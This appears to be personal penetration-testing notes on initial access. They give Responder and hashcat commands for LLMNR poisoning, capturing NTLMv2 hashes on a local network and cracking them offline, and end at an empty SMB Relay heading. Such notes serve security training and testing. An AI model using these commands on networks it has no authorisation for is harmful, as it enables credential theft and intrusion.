# Initial Access
## LLMNR Poisoning
### Capturing Responses
1. Verify you are on the right network
2. ```sudo responder -I eth0 -dwPv```
3. Navigate from the explorer window to \\(IP Address)
4. This will show you the hash as well as the NTLM version

### Crack the hash you retrieved
1. ```nano hashes.txt``
2. Copy and paste the entire line (from username to the end)
3. ```hashcat --help | grep NTLM``` will show you what number to use
4. ```hashcat -m 5600 hashes.txt (wordlist) -r OneRule```

## SMB Relay
